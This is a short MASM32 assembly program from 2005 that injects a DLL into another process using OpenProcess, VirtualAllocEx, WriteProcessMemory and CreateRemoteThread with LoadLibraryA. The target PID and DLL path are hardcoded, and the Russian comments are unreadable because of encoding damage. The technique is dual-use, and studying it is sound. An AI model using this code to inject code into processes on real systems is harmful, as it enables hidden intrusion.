                ;=======================================================
                ;               � � � � � � � � �                            
                ; ��������� DLL � �������� ������������ ������ ��������              
                ; ����: 01.07.2005                                                   
                ; �����: Bill Prisoner / TPOC                                        
                ;=======================================================

;===============================================================================
;                       Options and Includes                                           
;===============================================================================
.386
option casemap:none
.model flat,stdcall
include \tools\masm32\include\windows.inc
includelib \tools\masm32\lib\kernel32.lib
include \tools\masm32\include\kernel32.inc
include \tools\masm32\include\user32.inc
includelib \tools\masm32\lib\user32.lib
include \tools\masm32\include\advapi32.inc
includelib \tools\masm32\lib\advapi32.lib
;===============================================================================

;===============================================================================
;                       Initialized Data Section
;===============================================================================
.data                                                                                           
        lib db "c:\\dll.dll",0;��� DLL, ������� �������� � ����� �������                                
        dwSize equ $-lib;������ ������ � ������ DLL 
        kernelName db "kernel32.dll",0;��� Kernel32.dll
        loadlibraryName db "LoadLibraryA",0;��� ������� LoadLibraryA
        _LoadLibrary dd 0;����� ������� LoadLibrary                             
        ParameterForLoadLibrary dd 0;����� ������ � ������ DLL � ����� �������� 
        ThreadId dd 0;������������� �����                                       
        PID dd 1700;������������� �������� ��������                             
;===============================================================================

;===============================================================================
;                       Uninitialized Data Section                                             
;===============================================================================
.data?                                                                          
        hProcess dd ?                                                           
;===============================================================================

;===============================================================================
;                               Code Section                                    
;===============================================================================
.code
start:
    ;��������� ������� ���� ����� �������� DLL
        invoke OpenProcess,PROCESS_CREATE_THREAD or PROCESS_VM_WRITE or \
        PROCESS_VM_OPERATION,0,PID 
        mov hProcess,eax
        ;�������� ��������� ������ Kernel32.dll
        invoke GetModuleHandle,offset kernelName
        ;�������� ����� ������� LoadLibrary
        invoke GetProcAddress,eax,offset loadlibraryName
        mov _LoadLibrary,eax
        ;�������� ������ � ��������� ��������
        invoke VirtualAllocEx,hProcess,NULL,dwSize,MEM_RESERVE or MEM_COMMIT, \
               PAGE_READWRITE
        mov ParameterForLoadLibrary,eax
        ;������ ������ � ������ DLL � �� ������ ��������
        invoke WriteProcessMemory,hProcess,eax,offset lib,dwSize,NULL
    ;������� ��������� �����, ������� �������� LoadLibrary, 
        ;��� ����� �������� DLL � �������� ������������ ������ ��������.  
        invoke CreateRemoteThread,hProcess,NULL,NULL,_LoadLibrary, \
               ParameterForLoadLibrary,NULL,offset ThreadId
        invoke ExitProcess,0
end start
;===============================================================================
;                               End Program
;===============================================================================


;����� ��������� DLL ���������� DllMain � ���������� DLL_PROCESS_ATTACH.
;������ ��� ��������� ����� ��������� �� ������������� �����������.